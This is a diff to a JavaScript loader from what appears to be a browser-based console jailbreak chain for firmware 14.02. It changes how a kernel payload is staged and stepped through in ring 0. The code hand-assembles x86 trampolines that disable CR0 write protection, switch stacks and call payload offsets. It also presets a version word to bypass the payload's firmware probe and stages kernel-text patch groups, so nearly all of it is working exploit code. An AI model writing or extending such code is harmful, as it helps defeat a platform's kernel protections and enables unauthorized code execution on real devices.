@@ -1176,15 +1176,19 @@ async function loadRawKernel(url, k, kbase, room, vorab) {
 }
 
 
-/* Kpayload step-driver: the inflated 14.02 kpayload (kpayload.bin, 642888
-   bytes) copied into the kernel padding and driven one install call at a time
-   through afterglow's gate. The loader hands the kpayload entry to a real
-   kernel stack and it panics with no breadcrumb; this names the call. The
-   patch groups are plain kernel-text writes (no malloc), so they survive the
-   gate stack -- the first silent step is the patch group holding the bad
-   14.02 offset. Offsets are the kpayload's own main chain at 0x2718. */
+/* Kpayload step-driver. 1402zk: the payload's firmware probe is bypassed,
+   not moved. 0x115be scans [base+0x1300000, +0x2200000) one byte at a time
+   and that window opens in the unmapped hole above the RELRO segment here --
+   one read is a panic. Nineteen sites across the payload call it, so the
+   cached answer must be made valid once: 0x115be early-outs whenever the
+   word at image+0x98488 is nonzero. Preset it to 0x57a in userland and call
+   the table fill at 0x116be directly with edi=0x57a -- byte for byte the
+   state a successful probe leaves behind. 0x11bd1 is the only caller that
+   clears that word (and only main calls it), so it never runs.
+   The 0x2718 chain itself stays split into steps; the patch groups are plain
+   kernel-text writes. One new step per boot. */
 const KP_STEPS = [
-  [0x11bd1, "init: firmware detect + import/offset tables"],
+  [0x116be, "init: import/offset tables (probe bypassed)", { rdi: 0x57a }],
   [0x5cf3,  "patch group 1"],
   [0xa65,   "patch group 2"],
   [0x10b2,  "patch group 3"],
@@ -1192,6 +1196,7 @@ const KP_STEPS = [
   [0x256e,  "patch group 5 (syscalls 11/c5/c6)"],
   [0x3426,  "patch group 6 (54 kernel patches + exec handler)"],
 ];
+const KP_MAX_STEPS = 1;   /* diagnostic: name one new ring-0 call per boot */
 
 async function loadKpayloadSteps(k, kbase, room) {
   const c = host();
@@ -1224,80 +1229,68 @@ async function loadKpayloadSteps(k, kbase, room) {
   for (let o = 0x98380; o < blob.length; o += 8) c.p.write8(plus(data, o), v(0, 0));
   say("[kp] kpayload staged at " + text(data) + ", .bss cleared");
 
-  const t = plus(kbase, GH.rvaPad);
+  STATE.haltChain = true;    /* whatever happens below, stop after this step */
+
+  /* The probe caches its answer in this word and every later 0x115be call
+     early-outs on it. Writing it here is what makes the whole payload -- not
+     just init -- safe from the unmapped scan window. */
+  wr1(plus(data, 0x98488), 0x7a);
+  wr1(plus(data, 0x98489), 0x05);
+  say("[kp] version word preset to 0x57a -- the ring-0 scan never runs");
+  await nap(300);
+
   const tram = { n: 0 };
   const b1 = function (x) { wr1(plus(buf, GH.tram + tram.n), x); tram.n++; };
   const hex = function (h) { const u = unhex(h); for (let i = 0; i < u.length; i++) b1(u[i]); };
   const i32 = function (n) { for (let j = 0; j < 4; j++) b1(Math.floor(n / Math.pow(256, j)) % 256); };
   const q64 = function (q) { i32(q.low >>> 0); i32(q.hi >>> 0); };
-  const callAbs = function (rva) { hex("48b8"); q64(plus(t, rva)); hex("ffd0"); };
+  const callAbsAt = function (base, rva) { hex("48b8"); q64(plus(base, rva)); hex("ffd0"); };
   const wpOff = function () { hex("0f20c0"); hex("4825"); i32(0xfffeffff); hex("0f22c0"); };
   const wpOn  = function () { hex("0f20c0"); hex("480d"); i32(0x00010000); hex("0f22c0"); };
   const fire  = function () { const r = c.callAddr(plus(buf, GH.tor), [11, plus(buf, GH.tram)]); return r.lo >>> 0; };
   const markClear = function () { wr4(plus(buf, GH.mark), 0xDEADBEEF); wr4(plus(buf, GH.mark + 4), 0xDEADBEEF); };
   const markRead = function () { return [rd4(plus(buf, GH.mark)), rd4(plus(buf, GH.mark + 4))]; };
-  const saySync = function (m) { try { const x = new XMLHttpRequest(); x.open("GET", "ag_log?m=" + encodeURIComponent(m), false); x.send(); } catch (e) {} };
 
-  say("[kp] kernel base " + text(kbase) + ", padding " + text(t));
-  await nap(400);
-  if (!(await runPatchSet(room))) return false;
-  say("[kp] patch set call returned");
-  await nap(400);
-  const dmapPad = await paddingRW(k, kbase);
-  if (!dmapPad) { say("[kp] stopping: padding setup failed"); await nap(400); return false; }
+  say("[kp] kernel base " + text(kbase) + ", payload at " + text(data)
+      + " -- patchset and padding pde skipped this build");
+  await nap(300);
 
-  /* The payload's version probe scans [base+0x1300000, base+0x2200000) one
-     byte at a time in ring 0. That window starts in the hole between the
-     RELRO and RW segments here, and one read of an unmapped byte is a panic
-     with no signal. Plant the string it hunts for in the padding that was
-     just made RW+X and aim its window at that page instead. */
-  const scanAt = plus(t, 0x100000);
-  const verStr = unhex("732f72656c656173655f31342e303200");
-  if (!k.write(scanAt, verStr) || !sameBytes(k.read(scanAt, verStr.length) || new Uint8Array(0), verStr)) {
-    say("[kp] could not plant the version string at " + text(scanAt));
-    await nap(400);
-    return false;
-  }
-  const scanPatch = [
-    [0x115f5, "488d9000003001", "488d9000f01f01"],
-    [0x115fc, "480500002002",   "480510f01f01"],
-  ];
-  let probeMoved = true;
-  for (let i = 0; i < scanPatch.length; i++) {
-    if (!sameBytes(rdbuf(plus(data, scanPatch[i][0]), scanPatch[i][1].length / 2), unhex(scanPatch[i][1]))) {
-      probeMoved = false;
-    }
-  }
-  if (probeMoved) {
-    for (let i = 0; i < scanPatch.length; i++) wrbuf(plus(data, scanPatch[i][0]), unhex(scanPatch[i][2]));
-  }
-  say(probeMoved
-      ? "[kp] version probe aimed at " + text(scanAt)
-      : "[kp] version probe left as built -- the scan window may be unmapped");
-  await nap(400);
-
-  const callAbsAt = function (base, rva) { hex("48b8"); q64(plus(base, rva)); hex("ffd0"); };
   const magic = c.p.read4(data);
   if ((magic >>> 0) !== 0x464c457f) { say("[kp] staged blob lost its ELF magic"); return false; }
-  say("[kp] running the kpayload in place at " + text(data) + " -- no copy");
+
+  /* Same body every k.read/k.write above already ran: if the gate lost the
+     base, stop before it is pointed at a payload function. */
+  const hb = k.base();
+  if (!hb || !same(hb, kbase)) {
+    say("[kp] gate heartbeat lost the base -- not firing");
+    await nap(300);
+    return false;
+  }
+  say("[kp] gate heartbeat " + text(hb) + ", firing step 1 next");
+  await nap(300);
 
   let silent = 0;
-  for (let n = 0; n < KP_STEPS.length; n++) {
-    const rva = KP_STEPS[n][0], what = KP_STEPS[n][1];
+  for (let n = 0; n < KP_MAX_STEPS; n++) {
+    const rva = KP_STEPS[n][0], what = KP_STEPS[n][1], opt = KP_STEPS[n][2] || {};
     markClear();
     tram.n = 0;
     wpOff();
-    const stepStack = plus(t, 0xff000);
-    hex("48b9"); q64(stepStack); hex("488921");   /* [stepStack] = rsp */
-    hex("48bc"); q64(stepStack);                  /* rsp = stepStack */
-    hex("31ff"); hex("31f6"); hex("31c0");        /* rdi=0, esi=0, eax=0 */
+    /* Run on the syscall's own kernel stack: align it, park the old rsp in
+       the 16 bytes below the call, restore it after. The previous build used
+       the RELRO padding page as a stack here; nothing needs that now. */
+    hex("4889e1");                 /* mov rcx, rsp */
+    hex("4883e4f0");               /* and rsp, -16 */
+    hex("4883ec10");               /* sub rsp, 0x10 */
+    hex("48890c24");               /* mov [rsp], rcx */
+    if (opt.rdi !== undefined) { hex("bf"); i32(opt.rdi); }
+    else { hex("31ff"); }
+    hex("31f6"); hex("31c0");
     callAbsAt(data, rva);
     hex("4898");
-    hex("48b9"); q64(plus(buf, GH.mark));
-    hex("488901");
-    hex("48b9"); q64(stepStack); hex("488b21");   /* rsp = [stepStack] */
+    hex("48b9"); q64(plus(buf, GH.mark)); hex("488901");
+    hex("488b2424");               /* rsp = [rsp] */
     wpOn(); hex("31c0"); hex("c3");
-    say("[kp] SYNC entering [" + (n + 1) + "] 0x" + rva.toString(16) + " " + what + " (stack " + text(stepStack) + ")");
+    say("[kp] SYNC entering [" + (n + 1) + "] 0x" + rva.toString(16) + " " + what + " (host stack)");
     await nap(400);
     fire();
     const mk = markRead();
@@ -1308,31 +1301,29 @@ async function loadKpayloadSteps(k, kbase, room) {
     }
     let rc = mk[0];
     if (mk[1] === 0xffffffff) rc = mk[0] - 0x100000000;
-    say("[kp] [" + (n + 1) + "] 0x" + rva.toString(16) + " rc=" + rc + " -- " + what);
-    if (n === 0) {
-      const ver = rd4(plus(data, 0x98488)) & 0xffff;
-      const p0 = rd8(plus(data, 0x984e0));
-      say("[kp] payload reports version 0x" + ver.toString(16) + ", table word " + text(p0));
-      if (ver !== 0x57a) {
-        say("[kp] the payload did not find 14.02 -- stopping before a bad call");
-        await nap(400);
-        return false;
-      }
-      if (!p0 || !inText(p0)) {
-        say("[kp] the payload's kernel table is empty -- stopping");
-        await nap(400);
-        return false;
-      }
-      if (rc !== 0) {
-        say("[kp] init failed -- stopping before a bad call");
-        await nap(400);
-        return false;
-      }
+    say("[kp] [" + (n + 1) + "] rc=" + rc + " -- " + what);
+    const ver = rd4(plus(data, 0x98488)) & 0xffff;
+    const q0 = rd8(plus(data, 0x986f8));
+    const exp0 = plus(kbase, 0x1c0);
+    say("[kp] version word 0x" + ver.toString(16) + ", table[0] " + text(q0)
+        + (same(q0, exp0) ? " -- matches base+0x1c0" : " -- MISMATCH, wanted " + text(exp0)));
+    if (rc !== 0 || ver !== 0x57a || !same(q0, exp0)) {
+      say("[kp] step 1 did not leave the expected table -- stopping");
+      await nap(400);
+      return false;
     }
-    await nap(400);
   }
-  say("[kp] kpayload patch chain finished, " + silent + " silent");
-  return silent === 0;
+
+  say("[kp] step 1 returned cleanly -- 1402zk stops the chain here on purpose");
+  await nap(500);
+  say("[kp] idle heartbeat 1 of 3 after step 1");
+  await nap(700);
+  say("[kp] idle heartbeat 2 of 3 after step 1");
+  await nap(700);
+  say("[kp] idle heartbeat 3 of 3 after step 1");
+  await nap(700);
+  say("[kp] still alive after the idle window -- step 1 is clean");
+  return false;
 }/* ------------------------------------------------------- GoldHEN */
 
 /* This image is not a payload in the sense hen.bin is. The first 0x50000
@@ -2560,6 +2551,10 @@ async function attempt(ctx, opts) {
   const mode = (ctx.params && ctx.params.get("mode")) || "";
   if (mode === "kpstep") {
     iface.payload = await loadKpayloadSteps(k, kbase, hostFree);
+    if (STATE.haltChain) {
+      say("[kp] 1402zk diagnostic build -- stopping before the debug-settings pass");
+      return iface;
+    }
   } else if (want !== "") {
     iface.payload = (mode === "goldhen")
       ? await loadEnabler(want || "goldhen.bin", k, kbase, hostFree)
